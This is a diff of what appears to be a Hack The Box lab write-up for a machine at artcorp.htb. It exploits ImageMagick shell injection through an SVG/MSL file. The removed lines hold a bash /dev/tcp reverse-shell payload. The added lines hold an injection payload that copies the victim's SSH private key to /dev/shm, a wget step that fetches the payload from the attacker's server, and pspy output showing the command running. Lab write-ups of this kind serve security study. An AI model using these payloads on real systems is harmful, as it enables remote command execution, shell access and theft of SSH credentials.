@@ -220,16 +220,44 @@ cd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format 
 pkill mogrify
 ````
 
-https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html
+* There is an exploit process for [ImagemMagick](https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html)
 
+This exploit was retrived from RaidForums, no other that I tried to write worked well.
 ````xml
-<image authenticate='test" `bash -c "bash &>/dev/tcp/DEST_IP/DEST_PORT <&1"`;"'>
+<image authenticate='ff" `echo $(cat ~/.ssh/id_rsa)> /dev/shm/key`;"'>
   <read filename="pdf:/etc/passwd"/>
   <get width="base-width" height="base-height" />
   <resize geometry="400x400" />
   <write filename="test.png" />
   <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
-  <image xlink:href="msl:injection.svg" height="100" width="100"/>
+  <image xlink:href="msl:poc.svg" height="100" width="100"/>
   </svg>
 </image>
+````
+
+* Copy the poc to the remote folder
+
+````bash
+$ wget http://10.10.14.221:8000/poc.svg -O /var/www/dev01.artcorp.htb/convert_images/poc.svg 
+````
+
+* Pspy output
+````bash
+2022/01/29 17:50:40 CMD: UID=33   PID=22965  | cp -v poc.svg /var/www/dev01.artcorp.htb/convert_images/ 
+2022/01/29 17:51:01 CMD: UID=1000 PID=22979  | /bin/sh -c /usr/local/bin/convert_images.sh 
+2022/01/29 17:51:01 CMD: UID=1000 PID=22982  | /usr/local/bin/mogrify -format png poc.svg 
+2022/01/29 17:51:01 CMD: UID=0    PID=22983  | /bin/sh -c rm /tmp/* 
+2022/01/29 17:51:01 CMD: UID=1000 PID=22985  | pkill mogrify 
+2022/01/29 17:52:01 CMD: UID=0    PID=22996  | /usr/sbin/cron -f 
+2022/01/29 17:52:01 CMD: UID=0    PID=22995  | /usr/sbin/cron -f 
+2022/01/29 17:52:01 CMD: UID=0    PID=22994  | /usr/sbin/CRON -f 
+2022/01/29 17:52:01 CMD: UID=0    PID=22997  | /usr/sbin/CRON -f 
+2022/01/29 17:52:01 CMD: UID=0    PID=22998  | /usr/sbin/CRON -f 
+2022/01/29 17:52:01 CMD: UID=0    PID=22999  | cp -rp /root/conf/config_neofetch.conf /home/thomas/.config/neofetch/config.conf 
+2022/01/29 17:52:01 CMD: UID=1000 PID=23000  | /bin/bash /usr/local/bin/convert_images.sh 
+2022/01/29 17:52:01 CMD: UID=1000 PID=23001  | /usr/local/bin/mogrify -format png poc.svg 
+2022/01/29 17:52:01 CMD: UID=0    PID=23002  | /usr/sbin/CRON -f 
+2022/01/29 17:52:01 CMD: UID=0    PID=23005  | /bin/sh -c rm /tmp/* 
+2022/01/29 17:52:01 CMD: UID=1000 PID=23008  | 
+2022/01/29 17:52:01 CMD: UID=1000 PID=23007  | sh -c 'gs' -sstdout=%stderr -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 '-sDEVICE=pngalpha' -dTextAlphaBits=4 -dGraphicsAlphaBits=4 '-r72x72' "-sPDFPassword=ff" `echo $(cat ~/.ssh/id_rsa)> /dev/shm/key`;""  '-sOutputFile=/tmp/magick-R5ofha96RI9cw4VsZzCJO0q7tiunPnTR%d' '-f/tmp/magick-mC20wCmD2SNtM7CDW0mwwHsjZ9R2av4i' '-f/tmp/magick-iOezqKSMOQbuW0QxqtKsb-XPuEyBfDfK'   
 ````
